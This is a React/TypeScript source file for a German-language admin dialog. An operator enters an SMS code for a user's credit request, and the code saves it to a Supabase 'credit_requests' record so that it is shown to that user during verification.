import React, { useState } from "react";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
} from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { supabase } from "@/integrations/supabase/client";
import { toast } from "@/components/ui/sonner";
import { Key, Send, User } from "lucide-react";

interface CreditCodeDialogProps {
  open: boolean;
  onOpenChange: (open: boolean) => void;
  onSuccess: () => void;
  requestId: string;
  userName: string;
  userEmail: string;
}

export function CreditCodeDialog({ 
  open, 
  onOpenChange, 
  onSuccess, 
  requestId,
  userName,
  userEmail 
}: CreditCodeDialogProps) {
  const [code, setCode] = useState("");
  const [submitting, setSubmitting] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!code.trim()) {
      toast.error('Bitte geben Sie einen Code ein');
      return;
    }

    setSubmitting(true);
    try {
      const { error } = await supabase
        .from('credit_requests')
        .update({ sms_code: code.trim() })
        .eq('id', requestId);

      if (error) throw error;

      toast.success('SMS-Code wurde gesendet');
      setCode("");
      onOpenChange(false);
      onSuccess();
    } catch (error) {
      console.error('Error sending code:', error);
      toast.error('Fehler beim Senden des Codes');
    } finally {
      setSubmitting(false);
    }
  };

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="max-w-md">
        <DialogHeader>
          <DialogTitle className="flex items-center gap-2">
            <Key className="h-5 w-5 text-primary" />
            SMS-Code senden
          </DialogTitle>
          <DialogDescription>
            Der SMS-Code für den Kredit-Verifizierungsprozess wird sofort beim Nutzer angezeigt
          </DialogDescription>
        </DialogHeader>

        <div className="p-4 rounded-lg bg-muted/50 border">
          <div className="flex items-center gap-3">
            <div className="flex h-10 w-10 items-center justify-center rounded-full bg-primary/10">
              <User className="h-5 w-5 text-primary" />
            </div>
            <div>
              <p className="font-medium">{userName}</p>
              <p className="text-sm text-muted-foreground">{userEmail}</p>
            </div>
          </div>
        </div>

        <form onSubmit={handleSubmit} className="space-y-4">
          <div className="space-y-2">
            <Label htmlFor="code">SMS-Code</Label>
            <Input
              id="code"
              placeholder="z.B. 123456"
              value={code}
              onChange={(e) => setCode(e.target.value.toUpperCase())}
              className="font-mono text-lg tracking-wider"
              autoComplete="off"
            />
            <p className="text-xs text-muted-foreground">
              Dieser SMS-Code wird dem Nutzer während des Verifizierungsprozesses angezeigt
            </p>
          </div>

          <div className="flex justify-end gap-3">
            <Button type="button" variant="outline" onClick={() => onOpenChange(false)}>
              Abbrechen
            </Button>
            <Button type="submit" disabled={submitting || !code.trim()} className="gap-2">
              <Send className="h-4 w-4" />
              {submitting ? "Sende..." : "Code senden"}
            </Button>
          </div>
        </form>
      </DialogContent>
    </Dialog>
  );
}
